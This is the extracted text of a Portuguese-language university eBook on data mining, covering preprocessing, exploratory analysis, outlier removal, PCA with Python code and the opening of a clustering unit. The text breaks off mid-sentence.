--- Começo do arquivo: eBook - Data Mining.pdf ---

 
 
Estou entusiasmado para ajudá-los a descobrir o poder da mineração de dados 
e a impactar positivamente o mundo com as habilidades aprendidas aqui. 
Prepare-se para uma jornada desafiadora e gratificante! 
 
Boa leitura e estudos! 
Prof. Dr. Thiago Santana Lemes 
 
 

 
 
OBJETIVOS 
 
OBJETIVO GERAL 
Proporcionar uma compreensão dos princípios, algoritmos e aplicações da 
mineração de dados, capacitando os estudantes a aplicar esses conhecimentos 
na solução de problemas reais, na análise de dados e no desenvolvimento de 
sistemas inteligentes.  
OBJETIVOS ESPECÍFICOS 
• Conhecer os conceitos fundamentais da mineração de dados incluindo 
redução de dimensionalidade, agrupamento e mineração de padrões 
frequentes; 
• Desenvolver habilidades práticas em modelagem, seleção de algoritmos, 
ajuste de modelos e avaliação de desempenho; 
• Entender os fundamentos da análise exploratória de dados; 
• Compreender questões éticas e o impacto social da mineração de dados, 
incluindo viés algorítmico, privacidade de dados, e responsabilidade na 
tomada de decisões.  
 
Conheça como esse conteúdo foi organizado! 
Unidade 1: Conceitos iniciais de data mining 
Unidade 2: Análise exploratória dos dados 
Unidade 3: Redução de dimensionalidade 
Unidade 4: Clusterização 
Unidade 5: Mineração de padrões frequentes 
 
 
 

 
 
UNIDADE 1 CONCEITOS INICIAIS DE MINERAÇÃO DE DADOS 
 
É com grande prazer que damos início a essa jornada de aprendizado e 
descobertas. Nesta unidade, teremos a oportunidade de explorar os conceitos 
iniciais do fascinante universo de mineração de dados. 
OBJETIVOS DA UNIDADE 1  
Ao final dos estudos, você deverá ser capaz de: 
• Definir e utilizar conceitos básicos de mineração de dados. 
• Pré-processar conjuntos de dados 
• Configurar o ambiente de desenvolvimento. 
 
 

 
 
1.1 INTRODUÇÃO À MINERAÇÃO DE DADOS 
 
 
A mineração de dados é uma área antiga e que evoluiu bastante ao longo 
dos anos. A crescente evolução da tecnologia trouxe consigo computadores 
mais poderosos, diversos recursos de armazenamento de dados em nuvem em 
grandes quantidades (big data) e uma aquisição de dados cada vez mais 
acelerada. Para fazer uso de tantos dados e conseguir obter vantagens 
estratégicas é necessário lançar mão de inúmeras técnicas de análise de dados 
e ferramentas capazes de processar essas informações. No intuito de suportar 
as necessidades de entendimento desses conjuntos de dados é que surge a 
Descoberta de Conhecimento em Bases de Dados (Knowledge Discovery in 
Databases – KDD). 
 
O termo KDD foi formalizado por um grupo de pesquisadores no fim dos 
anos 80 e pode ser entendido como um processo de várias etapas que é 
complexo e envolve a atuação de profissionais com experiência, sendo possível 
existir procedimentos repetitivos no intuito de encontrar padrões em grandes 
bases de dados (Goldschmidt & Passos, 2005). Além disso, o KDD é um 
processo que tem como base diversas etapas operacionais, sendo as principais: 
Pré-processamento, Mineração dos Dados e Pós-processamento (Goldschmidt 
& Passos, 2005). 
 
A etapa de pré-processamento envolve basicamente organizar, limpar e 
transformar os dados deixando-os prontos para serem utilizados nos algoritmos. 
A etapa de mineração de dados tem como objetivo extrair informações dos dados 
e tornar evidente padrões que possam ser utilizados. É nessa etapa que o 
conhecimento se torna evidente e fica disponível para ser utilizado. A etapa de 
pós-processamento nem sempre é aplicada, porém funciona como uma 
consolidação do conhecimento obtido. 
 
 

 
 
 
Vale reforçar então que a mineração de dados é uma etapa dentro de 
KDD e que ambos os conceitos são extremamente importantes em diversas 
áreas atualmente como saúde, marketing, indústria, varejo, educação dentre 
outras. O conhecimento a respeito de padrões, tendências e comportamentos 
em geral é muito valioso e promove uma vantagem competitiva muito grande no 
mercado. A digitalização de grandes empresas aliado a todos os investimentos 
em tecnologia, dados e inteligência artificial tornou possível grandes 
transformações na sociedade. O estudo da área de dados nunca foi tão essencial 
quanto hoje e vai continuar crescendo ao longo dos próximos anos. 
 
1.2 AMBIENTE DE DESENVOLVIMENTO 
 
O Google fornece uma plataforma de desenvolvimento para projetos de 
ciência de dados e inteligência artificial chamada Colab. Esse ambiente é gratuito 
para utilização, podendo fornecer recursos computacionais extras por meio de 
pagamento. A Figura 1.1 abaixo mostra a página inicial que pode ser acessada 
por meio do link https://colab.research.google.com. 
 
Figura 1.1: Página inicial do Google Colab 

 
 
A plataforma possui diversos exemplos e tutoriais e todos estão 
acessíveis já na aba Exemplos como mostrado na Figura 1.1. Para iniciar um 
projeto basta clicar no botão azul Novo notebook. Todos os códigos que serão 
apresentados nesse texto podem ser desenvolvidos no ambiente do Google 
Colab. A vantagem é que a maioria das bibliotecas padrão no universo de data 
science e machine learning já estão instaladas facilitando muito o início do 
desenvolvimento de um projeto. Obviamente é possível instalar bibliotecas caso 
elas não estejam disponíveis de início no ambiente. Para fazer isso basta utilizar 
um comando no formato: !pip install “nome_da_biblioteca”. 
 
 
1.3 LIMPEZA DE DADOS 
 
Na maioria dos projetos reais que envolvem análise de dados existem 
problemas relacionados à qualidade dos dados. Esses problemas podem surgir 
por diversos motivos, como por exemplo um conjunto de dados que é formado 
pela aquisição de informações de sensores e que em alguns momentos falham, 
deixando registros em branco, ou mesmo dados provenientes de pesquisas, os 
quais podem ter registros faltantes. Para lidar com esses dados incompletos 
existem diversas abordagens, entre elas, preencher os elementos faltantes com 
a média ou a mediana dos registros ou então remover os registros da análise. 
A remoção tem a desvantagem da perda de informações, mas em alguns 
casos não há solução, por outro lado, o preenchimento com a média insere 
valores que não são exatos e para cada projeto é necessário validar qual a 
melhor estratégia. A Figura 1.2 abaixo ilustra um conjunto de dados 
implementado por meio da biblioteca Pandas (pandas dataframe) (The pandas 
development team, 2024) com alguns registros faltantes (NaN – Not a Number) 

 
 
 
Figura 1.2: Dataset com valores faltantes 
 
 
 
Uma maneira de preencher os dados numéricos com a média é utilizar o 
módulo SimpleImputer da biblioteca Scikit-learn (Pedregosa et al., 2011). O 
trecho de código apresentado na Figura 1.3 abaixo ilustra a implementação 
dessa abordagem. Na sequência, a Figura 1.4 mostra o conjunto de dados sem 
valores nulos nas colunas Altura e Peso. 
 
Figura 1.3: Implementação do SimpleImputer para preenchimento de 
dados com a média 

 
 
 
Figura 1.4: Dataframe após aplicação do SimpleImputer para preencher 
dados numéricos de Altura e Peso com a média 
 
Para remover todos os registros nulos de uma só vez é possível utilizar o 
comando dropna() da biblioteca Pandas. Veja o trecho de código apresentado 
na Figura 1.5 abaixo. 
 
Figura 1.5: Remoção de dados nulos em um dataframe 
 
Na Figura 1.5 acima, inplace é um parâmetro que indica que a operação 
de remoção deve ser executada permanentemente na memória. Além disso, 
ignore_index faz com que os índices do dataframe sejam numerados novamente 
de 0 até o fim. O dataframe é apresentado na Figura 1.6 abaixo. 
 
Figura 1.6: Conjunto de dados após remoção de dados nulos 
 
No caso da remoção é perceptível a perda de registros que é sempre ruim, 
mas em alguns casos é a única maneira devido à qualidade dos dados. Existe 
ainda uma outra possibilidade nativa da biblioteca Pandas que é o fillna(), na 

 
 
qual todos os valores nulos são preenchidos com o valor informado entre os 
parêntesis. Fica claro que existem maneiras distintas de tratar dados nulos e a 
melhor forma deve ser sempre avaliada com cautela. 
 
1.4 CONVERSÃO DE DADOS 
 
Outra questão importante em projetos de mineração de dados é a 
conversão de dados categóricos em numéricos. Isso se deve ao fato de que a 
maioria dos modelos só conseguem processar dados numéricos. Para clarificar 
esse conceito vamos tomar como exemplo o dataset da Figura 1.7 abaixo que é 
uma versão sem valores nulos da que foi apresentada na Figura 1.2. Temos a 
variável (coluna) “Sexo” com valores “M” ou “F”. Nesse caso, “M” pode ser 
representado por 1 e “F” por 0. 
 
 
Figura 1.7: Dataset sem dados nulos 
A variável “Escolaridade” apresenta uma situação interessante pois 
possui três valores distintos (Superior, Médio e Pós-graduação). A mesma lógica 
empregada na variável “Sexo” pode ser aplicada aqui, mas pela quantidade 
maior de opções irá gerar mais colunas. Além disso, a variável “Possui casa 
própria” também pode ser modificada seguindo a lógica da variável “Sexo” e 
utilizar 1 ou 0, porém agora no lugar de “Sim” e “Não”. 

 
 
 
Figura 1.8: Dataset com variáveis categóricas convertidas 
A Figura 1.8 acima apresenta o dataset contendo a nova configuração em 
que as variáveis categóricas foram convertidas. Vale destacar que a variável 
“Escolaridade” agora precisa de duas colunas para ser representada: 
“Escolaridade_Pós-graduação” e “Escolaridade_Superior”. Quando a amostra 
se referir a uma pessoa com Pós-graduação irá aparecer 1 na coluna 
“Escolaridade_Pós-graduação” e 0 na coluna “Escolaridade_Superior”. No caso 
em que ambas as colunas forem 0 automaticamente indica que a escolaridade 
é “Médio”. O trecho de código abaixo (Figura 1.9) mostra a implementação 
completa para fazer a conversão das variáveis categóricas. 
 
Figura 1.9: Implementação da conversão de dados categóricos utilizando 
a biblioteca Pandas 
Esse tipo de abordagem na qual variáveis categóricas são convertidas em 
numéricas é também conhecido como One-Hot-Encoding. As variáveis binárias 
criadas para representar as variáveis categóricas são conhecidas como dummy. 
 
 
 
 

 
 
1.5 ENRIQUECIMENTO DE DADOS 
 
O enriquecimento de dados pode ser visto como uma melhoria do 
conjunto de dados atuais. Essa abordagem pode envolver transformações e 
padronizações dos dados, adição de novos dados provenientes de outras fontes 
que não as iniciais, limpeza dos dados e criação de novos dados com base nos 
originais. Nesse texto, iremos dar foco na possibilidade de criação de uma nova 
coluna com base em outras colunas já existentes. Vamos utilizar o conjunto de 
dados apresentado na Figura 1.8 e criar uma nova coluna com base na “Altura” 
e “Peso”. Utilizando essas duas características é possível calcular o Índice de 
Massa Corporal (IMC) que é dado pela expressão abaixo: 
𝑖𝑚𝑐= 𝑝𝑒𝑠𝑜∗𝑎𝑙𝑡𝑢𝑟𝑎!                                Equação 1.1 
Para calcular o IMC e criar uma nova coluna contendo seu valor podemos 
utilizar o método apply() do Pandas e aplicar ao dataframe como mostra o trecho 
de código abaixo. 
df['imc'] = df[['Altura', 'Peso']].apply(lambda x : np.round(x['Peso']/x['Altura']**2,2), 
axis=1) 
A Figura 1.10 abaixo mostra o dataframe contendo a nova coluna IMC. 
 
 
 
Figura 1.10: Dataframe contendo a coluna IMC 

 
 
O exemplo acima de criação de uma nova coluna é bastante comum na 
área de dados e trás novas perspectivas. Devemos nos atentar para o contexto 
do problema, visto que nem sempre é possível criar novas colunas. 
 
1.6 TRANSFORMAÇÃO DE DADOS 
 
Outro ponto crucial na etapa de pré-processamento dos dados é o de 
transformação, o qual leva todos os valores registrados para um mesmo patamar 
de comparação. O dataset da Figura 1.10 nos ajuda a entender essa situação 
ao tomar como exemplo as variáveis “Altura”, “Peso” e “imc”. De forma geral, a 
altura de uma pessoa é um número maior do que zero e menor do que 2,5, 
considerando a unidade de medida metros (m). O peso de uma pessoa também 
é um número maior do que zero e normalmente abaixo de 150, considerando a 
unidade de medida quilogramas (kg). Vale ressaltar que obviamente podem 
existir pessoas com medidas superiores às comentadas, mas aqui nesse texto, 
iremos nos ater a poucos valores para fins pedagógicos. Considerando essa 
explicação, vemos que os valores de peso e altura estão em patamares bem 
diferentes, e isso pode atrapalhar em alguns casos a descoberta de padrões ou 
mesmo levar modelos de Machine Learning a não compreenderem bem a 
relação entre os dados, ou mesmo atribuir maior importância a um conjunto por 
possuir valores muito maiores do que o outro conjunto. Para mitigar esse 
problema, aplica-se um procedimento de transformação aos dados que 
padroniza todos baseado em uma lógica. A Figura 1.11 abaixo mostra o mesmo 
dataset da Figura 1.10, mas agora com as variáveis “Altura”, “Peso” e “imc” 
transformadas. 
 

 
 
Figura 1.11: Dataset com variáveis “Altura”, “Peso” e “imc” transformadas 
Vale destacar que existem vários tipos de métodos para transformar os 
dados, dentre eles se destacam o mínimo e máximo (MinMax) e a 
estandardização (Standardization). Em muitos casos, uma certa transformação 
pode ajudar os algoritmos a performarem melhor e por isso, cabe ao profissional 
de Ciência de Dados juntamente com a equipe do projeto definir qual abordagem 
é a mais adequada. A Figura 1.11 mostra o resultado da transformação após a 
utilização do método MinMax da biblioteca Scikit-learn que tem por base obter o 
valor mínimo e o valor máximo no conjunto observado. A coluna “Peso” possuía 
o valor máximo de 101 na terceira linha e após o MinMax se transformou em 1, 
enquanto o valor mínimo era de 77 e agora é 0. Dessa forma, a lógica aqui é 
transformar todos os valores que estão entre 77 e 101 para uma nova faixa de 
valores correspondentes entre 0 e 1. O trecho de código apresentado na Figura 
1.12 abaixo mostra a implementação da transformação dos dados. 
 
Figura 1.12: Implementação da transformação de dados utilizando MinMax 
 
 
 
 
 
 
 

 
 
UNIDADE 2 ANÁLISE EXPLORATÓRIA DE DADOS 
 
Tivemos uma ideia básica a respeito da mineração de dados fazendo 
algumas manipulações, transformações e conversões de dados. Foi possível 
perceber que existem diversos conceitos envolvidos e que eles são essenciais 
para o bom andamento de um projeto que tem por base os dados. 
Nessa nova unidade iremos caminhar no sentido de explorar de forma 
básica os dados, aplicando conceitos estatísticos, gerando gráficos para 
visualizar os dados e tentando encontrar relações interessantes. 
OBJETIVOS DA UNIDADE 2 
Ao final dos estudos, você deverá ser capaz de: 
• Realizar a análise exploratória dos dados 
 
• Descobrir relações básicas entre os dados 
 
 
 

 
 
2.1. MEDIDAS DE TENDÊNCIA CENTRAL 
 
Sempre que se inicia um projeto de mineração de dados uma análise 
exploratória de dados é necessária. As tomadas de decisão, escolha de 
algoritmos e escolha de apresentação de resultados passa pelo completo 
entendimento do conjunto de dados que está sendo utilizado. 
Como primeiros passos, é preciso visualizar todas as variáveis 
disponíveis, entender os seus tipos e como estão distribuídos. Variáveis 
numéricas podem ser provenientes de medições ou registros como altura e peso 
de indivíduos ou mesmo indicações de que algo estava ligado ou desligado 
(funcionando ou não funcionando, presente ou ausente, ...) ou se determinada 
ação foi tomada ou não. Variáveis que indicam dois estados são conhecidas 
como binárias e podem ser representadas por palavras (masculino/feminino - 
string) ou por booleanos (Verdadeiro/Falso – True/False). Além disso, essa 
lógica de representar dois estados pode ser estendida para diversos outros. A 
Figura 2.1 a seguir ilustra os tipos de variáveis do dataframe já apresentado na 
Figura 1.7 e que foi explorado na seção anterior. Para gerar os tipos de variáveis 
foi utilizado o método info() da biblioteca Pandas. 
 
Figura 2.1: Tipos de variáveis no dataframe 
 

 
 
Na Figura 2.1, as variáveis “Sexo”, “Escolaridade” e “Possui casa própria” 
são do tipo texto (string). O Pandas apresenta essas variáveis do tipo texto como 
object. “Possui trabalho CLT” é do tipo inteiro e o Pandas apresenta como int64. 
As variáveis “Altura” e “Peso” são do tipo float e o Pandas apresenta float64. “Já 
realizou algum procedimento cirúrgico” é uma variável do tipo bool, visto que só 
apresenta valores True ou False. O comando info() do Pandas é extremamente 
útil pois consolida de maneira simples todas as variáveis que fazem parte do 
dataframe, facilitando a visualização e conferência de informações. 
Após essa inspeção inicial nos dados é muito importante verificar as 
medidas de tendência central, dispersão dos dados, correlações entre variáveis 
e finalmente uma representação visual. A Figura 2.2 abaixo mostra a utilização 
do comando describe() do Pandas que retorna de uma só vez a média, o desvio 
padrão, valores mínimos e máximos e os percentis dos dados, sendo um 
comando extremamente útil. 
 
Figura 2.2: Descrição dos dados utilizando Pandas e describe 
Para calcular os valores de média, mediana e desvio padrão 
separadamente é possível utilizar respectivamente os comandos mean(), 
median(), std(). 

 
 
 
Figura 2.3: Cálculo da média, mediana e desvio padrão separados por coluna 
A Figura 2.3 acima ilustra a implementação do cálculo das medidas de 
tendência central em cada coluna separadamente. Além disso, o comando 
round() da biblioteca Numpy (Harris et al., 2020) foi utilizado para arredondar a 
resposta exibida pelo print() em quatro casas decimais. Vale ressaltar que é 
possível calcular todas essas medidas de uma só vez para todas as colunas 
numéricas, mas aqui, para fins de ilustração com print, foi feito de forma 
separada. O cálculo da moda (valor que mais ocorre em um conjunto de dados) 
pode ser feito por meio do comando mode() ou mesmo por meio do comando 
value_counts(). Especialmente o comando value_counts() apresenta a 
quantidade de valores únicos. O elemento que possui mais valores iguais é a 
moda. A Figura 2.4 abaixo mostra esse comando aplicado à coluna “Altura” e o 
valor de 1,80 aparecendo no topo com 2 repetições no conjunto de dados. 

 
 
 
Figura 2.4: Quantidade de valores únicos 
 
2.2. CORRELAÇÃO 
 
A correlação é uma medida estatística que avalia a relação entre duas 
variáveis. Para verificar a correlação entre as variáveis pode-se utilizar o 
comando corr() da biblioteca Pandas como mostrado na Figura 2.5 abaixo. 
 
Figura 2.5: Correlação entre as variáveis 
 
 
 

 
 
Esse comando devolve um dataframe contendo as correlações ao se 
analisar a linha e a coluna. A diagonal principal é a correlação perfeita (1.0) visto 
que é a comparação da variável com ela mesma. Valores mais próximos de 1 
indicam uma correlação forte no sentido positivo, ou seja, as variáveis aumentam 
juntas. Valores mais próximos de -1 indicam uma correlação forte no sentido 
negativo, ou seja, enquanto uma variável aumenta a outra diminui. As variáveis 
nesse exemplo, “Peso” e “Altura” possuem uma correlação de 0.59 
aproximadamente, ou 59% que não indica uma correlação muito forte. 
Uma outra maneira interessante de verificar a correlação entre variáveis 
é através de um mapa de calor. As bibliotecas Matplotlib e Seaborn (Hunter, 
2007; Waskom, 2021) ajudam nessa tarefa. Veja a Figura 2.6 a seguir. 
 
Figura 2.6: Mapa de calor das variáveis Altura e Peso 
 
 
 

 
 
É possível perceber na Figura 2.6 que a cor mais clara representa a 
correlação 1.0. Além disso, de acordo com a escala de cor, quanto mais escuro, 
mais fraca a correlação se torna. Obviamente esse exemplo é muito simples e 
só ilustra a comparação entre duas variáveis, porém, todos os passos anteriores 
se aplicam para quantidades bem maiores de dados. Para gerar a Figura 2.6 foi 
utilizado o trecho de código abaixo na Figura 2.7: 
 
Figura 2.7: Implementação do código para gerar o mapa de calor 
 
Além do mapa de calor é possível fazer um gráfico de dispersão (scatter 
plot) para verificar a relação entre duas variáveis. Veja a Figura 2.8 a seguir. 
 
Figura 2.8: Gráfico de dispersão para as variáveis Altura e Peso 

 
 
No gráfico acima é possível perceber uma certa tendência de aumento no 
peso à medida em que o valor da altura aumenta. A Figura 2.8 foi gerada por 
meio do trecho de código abaixo (Figura 2.9). 
 
Figura 2.9: Código para implementação do gráfico de dispersão 
 
2.3. ANÁLISE DE OUTLIERS 
 
Valores discrepantes, também conhecidos como outliers são comuns em 
diversos conjuntos de dados. Tais valores podem ocorrer devido à registro 
incorreto de informações, seja por eventos especiais em determinado registro, 
por exemplo, em um conjunto de dados de vendas de uma loja, uma promoção 
pode fazer com que as vendas aumentem muito gerando valores muito maiores 
do que o normal. Dessa forma, os outliers fogem ao padrão da distribuição 
comum dos dados. Os outliers portanto precisam ser investigados com calma e 
necessitam de um entendimento do contexto do problema. Em muitos casos, os 
outliers podem ser removidos, em outros, eles precisam ser mantidos, porém 
com a atenção a esse contexto especial. Veja a figura abaixo que ilustra dados 
a respeito de algumas cidades Brasileiras: 

 
 
 
Figura 2.10: Dados de algumas cidades Brasileiras 
 
É fácil perceber olhando os dados da figura acima que a cidade de São 
Paulo é um outlier em se tratando de população, visto que possui muito mais 
habitantes em relação às outras capitais. O Rio de Janeiro também possui muitos 
habitantes e está em segundo lugar em quantidade. Uma maneira interessante 
de visualizar os dados é por meio de um diagrama de caixa (boxplot). Veja a 
Figura 2.11 abaixo. 

 
 
 
Figura 2.11: Boxplot referente às cidades Brasileiras 
Em um diagrama de caixa a linha que fica aproximadamente no meio do 
retângulo é a mediana (50%) dos dados a borda superior representa o percentil 
de 75% e a linha inferior o percentil 25%. As duas linhas externas ao retângulo 
representam os limites superior e inferior e tudo que está acima ou abaixo dessas 
linhas é considerado um outlier. Na figura acima é fácil visualizar os pontos 
referentes à São Paulo e Rio de Janeiro muito acima do limite superior, sendo 
obviamente outliers. 
 
Vamos agora analisar um exemplo de remoção de outliers. Vale destacar 
que o exemplo é meramente ilustrativo para clarificar o processo de remoção e 
não quer dizer que em um projeto real seja sempre necessário fazer isso, 
devendo-se validar o contexto dos dados e o objetivo final. Será utilizado um 
conjunto de dados referente ao problema de transações fraudulentas em e-
commerces disponível em link. Esse conjunto de dados, originalmente possui 
mais colunas do que será apresentado nesse material, porém, os dados 
mantidos aqui são suficientes para o entendimento.  

 
 
Veja na Figura 2.12 a seguir os primeiros cinco registros desse dataset, 
que possui no total 1.472.952 registros. 
 
Figura 2.12: Dataset contendo os dados de transações fraudulentas em e-
commerces 
 
O dataset na figura acima mostra diversas características referentes às 
compras on-line como a quantidade, o método de pagamento, a categoria do 
produto, se é uma compra fraudulenta ou não dentre outras. Para o exemplo de 
remoção de outliers apenas a variável “Quantidade de Transações” será 
utilizada. A Figura 2.13 abaixo ilustra um gráfico de caixa para essa variável. 
 
 
Figura 2.13: Boxplot para a variável “Quantidade de Transações” antes do 
tratamento de outliers 

 
 
Seguindo o mesmo raciocínio exposto anteriormente é perceptível uma 
grande quantidade de outliers nessa variável. Existem muitas transações em 
quantidades acima dos milhares. O retângulo do boxplot é pouco perceptível. 
Para o tratamento dos outliers será utilizada a técnica de remoção interquartil. 
Nessa abordagem o primeiro quartil (Q1) e o terceiro quartil (Q3) são 
encontrados e, na sequência, a diferença entre eles é calculada (interquartile 
range - IQR). Após isso, um cálculo é realizado para estimar os valores que estão 
acima do limite superior ou abaixo do limite inferior. Tal cálculo utiliza um fator 
de multiplicação (normalmente 1,5 na maioria dos casos, sendo utilizado por 
diversos autores). 
𝑑𝑎𝑑𝑜𝑠< 𝑄1 −1,5 ∗𝐼𝑄𝑅                         Equação 2.1 
𝑑𝑎𝑑𝑜𝑠> 𝑄3 + 1,5 ∗𝐼𝑄𝑅                         Equação 2.2 
As equações acima definem os limites de corte para os dados, ou seja, 
dados que estão abaixo do resultado da expressão à direita na Equação 2.1 ou 
dados que estejam acima do resultado da expressão à direita na Equação 2.2 
serão eliminados pois se tratam de outliers. 
A Figura 2.14 abaixo apresenta o gráfico de caixa para a variável 
“Quantidade de Transações” após a remoção dos outliers. 
 
 

 
 
 
Figura 2.14: Boxplot para a variável “Quantidade de Transações” após o 
tratamento de outliers 
 
 
Comparando as figuras 2.13 e 2.14 é possível notar uma grande diferença 
entre as distribuições dos dados. Dessa forma fica clara a efetividade do método 
para esse conjunto de dados. Vale destacar que após o a remoção dos outliers 
o dataset ficou com 751.255 registros. A Figura 2.15 abaixo apresenta um trecho 
de código contendo a metodologia para remoção de outliers interquartil. Foi 
implementada uma função por meio da palavra reservada def e na sequência 
uma cópia dos dados foi feita para finalmente a função ser chamada para 
remover os outliers da variável “Quantidade de Transações”. 
 
 
Figura 2.15: Implementação do método de remoção de outliers interquartil 

 
 
2.4. ANÁLISE GRÁFICA 
 
No geral existem diversos tipos de representações gráficas para os dados 
e a escolha depende do ponto de vista que quer ser enfatizado. Novamente 
tomando como exemplo o dataset de transações fraudulentas apresentado 
inicialmente na Figura 2.12, pode-se utilizar histogramas para verificar a 
distribuição das variáveis numéricas. Veja a Figura 2.16 abaixo. 
 
Figura 2.16: Histograma das variáveis numéricas contidas no dataset de 
transações fraudulentas 
A variável “Quantidade de Transações” está concentrada em valores 
abaixo de 2000 como é possível ver na figura acima no quadro superior 
esquerdo. Além disso, uma informação interessante é a distribuição das idades 
que possui a maioria dos valores em torno de 35 a 40 anos como mostrado no 
quadro superior direito na figura acima. As variáveis “Idade da Conta em Dias” e 
“Hora da Transação” parecem ter um equilíbrio na distribuição dos dados, não 

 
 
tendo nada que se destaque muito. A Figura 2.16 acima foi gerada por meio do 
trecho de código abaixo (Figura 2.17). 
 
Figura 2.17: Trecho de código mostrando a implementação dos 
histogramas. 
 
As variáveis categóricas como “Método de Pagamento” e “Categoria do 
Produto” podem ser avaliadas por meio de gráficos de barras (countplot). 
 
 
Figura 2.18: Gráficos de barras para as variáveis “Método de 
Pagamento” e “Categoria do Produto” 
 
 
As duas variáveis possuem um equilíbrio em relação aos seus respectivos 
valores como mostrado na Figura 2.18, ou seja, no caso dos métodos de 
pagamento não existe uma prevalência de nenhum deles e no caso da variável 
categoria do produto todas vendem aproximadamente de forma equilibrada. 

 
 
Uma outra visualização de dados muito interessante é o pairplot que apresenta 
as relações entre todas as variáveis numéricas no dataset. Veja a Figura 2.19 a 
seguir. 
 
Figura 2.19: Pairplot das variáveis 
 
 
 

 
 
Ao analisar a Figura 2.19 acima vemos que as variáveis “Idade do Cliente” 
e “Quantidade de Transações” apresentam uma relação interessante entre si. É 
possível ver na figura central da primeira linha que o aumento na idade implica 
em um aumento na quantidade de transações até um certo limite, e após isso, o 
aumento da idade passa a implicar em diminuição das transações. Nenhuma 
outra figura apresenta relação significativa. 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 

 
 
UNIDADE 3 REDUÇÃO DE DIMENSIONALIDADE 
 
Nesse momento já somos capazes de aplicar operações e transformações aos 
dados. Além disso já temos ferramentas para explorar e entender melhor as 
informações. Agora iremos trabalhar na redução de dimensionalidade. 
OBJETIVOS DA UNIDADE 3 
Ao final dos estudos, você deverá ser capaz de: 
• Implementar um algoritmo de redução de dimensionalidade 
• Compreender a importância de reduzir a dimensão dos dados 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 

 
 
3.1. REDUÇÃO DE DIMENSIONALIDADE 
 
 
A redução de dimensionalidade é um conceito utilizado em diversos 
conjuntos de dados no intuito de torná-los menos complexos. Essa é uma 
maneira de simplificar a representação dos dados e manter o máximo de 
informação possível. Além disso, a redução de dimensionalidade ajuda a 
remover informações redundantes. Em muitos casos, modelos de machine 
learning podem se tornar mais simples tanto do ponto de vista de quantidade de 
variáveis quanto do ponto de vista de custo computacional, visto que a remoção 
de características reduz o tempo de treinamento. 
 
Existem diversas técnicas de redução de dimensionalidade com o Análise 
de Componentes Principais (PCA), Análise de Discriminante Linear (LDA), t-
Distributed Stochastic Neighbor Embedding (t-SNE), Autoencoders dentre 
outras. Nesse material estudaremos a PCA, ficando a cargo do leitor buscar 
conhecer as demais técnicas. 
 
 
 
 
 
 
 
 
 
 
 
 

 
 
 
3.2. ANÁLISE DE COMPONENTES PRINCIPAIS 
 
A Análise de Componentes Principais (PCA) é uma técnica de redução de 
dimensionalidade muito utilizada. Dado um conjunto de dados (tabela/dataset), 
seu princípio de funcionamento está na combinação linear das colunas 
existentes. Dessa forma é possível escolher a quantidade de colunas resultantes 
dessa operação que passarão a ser as novas variáveis no dataset. As colunas 
resultantes possuem a maior variância possível com base na combinação linear 
realizada, dessa forma, a redução de variáveis preserva a maior parte da 
variabilidade dos dados originais. A PCA é extremamente útil nos casos em que 
existe uma quantidade muito grande de variáveis para determinado problema. 
No intuito de ilustrar essa técnica será utilizado um conjunto de dados 
proveniente do Kaggle. Os dados em questão podem ser encontrados no link e 
se referem a indicadores socioeconômicos e fatores de saúde em diversos 
países. Os nomes das colunas foram traduzidos do inglês para o português. A 
Figura 3.1 a seguir apresenta os cinco primeiros registros do dataset. 
 
 
Figura 3.1: Dataset com indicadores socioeconômicos e fatores de saúde 
 
 
Para implementar a PCA é interessante que os dados sejam 
transformados 
utilizando 
alguma 
das 
estratégias 
(MinMaxScaler, 
StandardScaler, ...) já mencionadas anteriormente. O trecho de código abaixo 
implementa de forma básica a aplicação da PCA a esse conjunto de dados 
reduzindo de 9 variáveis para 3. 

 
 
import pandas as pd 
import matplotlib.pyplot as plt 
from sklearn.preprocessing import MinMaxScaler 
from sklearn.decomposition import PCA 
 
#Ler dados no diretório local 
df = pd.read_csv('./Datasets/Clustering PCA/Country-data.csv') 
 
#Renomear colunas 
df.rename(columns={'country': 'país', 'child_mort': 
'mortalidade_infantil', 'exports': 'exportações', 
                  'health': 'gastos_com_saúde', 'imorts': 
'importações', 'income': 'renda', 'inflation': 'inflação', 
                  'life_expec': 'expectativa_de_vida', 'total_fer': 
'fertilidade_total' , 'gdpp': 'PIB_PER_CAPITA'}, 
          inplace=True) 
 
#Transformar os dados 
scaler = MinMaxScaler() 
data_transformed = scaler.fit_transform(df.drop('país', axis=1)) 
df_transformed = pd.DataFrame(data=data_transformed, 
columns=df.drop('país', axis=1).columns) 
df_transformed = pd.concat([df['país'], df_transformed], axis=1) 
 
#PCA 
pca = PCA(n_components=3) 
X = pca.fit_transform(df_transformed.drop('país', axis=1)) 
df_pca = pd.DataFrame(data=X, columns=['component 1', 'component 2', 
'component 3']) 
 
print(df_pca) 
 
#Plot 3D 
fig = plt.figure(figsize=(10,8)) 
ax = fig.add_subplot(projection='3d') 
ax.scatter(df_pca['component 1'], df_pca['component 2'], 
df_pca['component 3']) 
ax.set_xlabel('component 1') 
ax.set_ylabel('component 2') 
ax.set_zlabel('component 3') 
fig.show() 
 
A Figura 3.2 a seguir apresenta o dataframe resultante com as 3 
componentes calculadas pela PCA. Dessa forma, saímos de um conjunto de 
dados que possuía 9 variáveis numéricas para um novo com apenas 3. Além 
disso, é possível ver um gráfico de dispersão de dados baseado nas três novas 
variáveis (Figura 3.3). 

 
 
 
Figura 3.2: Dataframe resultante após a aplicação da PCA 
 
 
Figura 3.3: Representação em três dimensões das componentes calculadas 
pela PCA 

 
 
Vale ressaltar que a PCA implementada pela biblioteca Scikit-learn é 
bastante flexível, de maneira que a quantidade de variáveis resultantes é 
indicada pelo parâmetro n_components no construtor do objeto PCA (trecho de 
código acima). 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 

 
 
UNIDADE 4 CLUSTERIZAÇÃO 
 
Nesta unidade, exploraremos os princípios da clusterização, que é uma tarefa 
comumente executada por modelos não-supervisionados. A clusterização, uma 
técnica fundamental no campo da mineração de dados, é dedicada à 
organização de conjuntos de dados em subgrupos ou “clusters”, de modo que 
os elementos dentro de cada cluster sejam mais semelhantes entre si do que 
com elementos de outros clusters. 
 
OBJETIVOS DA UNIDADE 4 
Ao final dos estudos, você deverá ser capaz de: 
• Implementar algoritmos de clusterização 
 
• Analisar resultados e gerar visualizações de clusters 
 
 
 
 
 
 
 
 
 
 
 
 

 
 
4.1. CLUSTERIZAÇÃO 
 
A clusterização é uma técnica muito útil em mineração de dados visto que 
ajuda a agrupar dados semelhantes. Compreender quais dados são 
semelhantes entre si e a qual subgrupo pertencem é extremamente útil em 
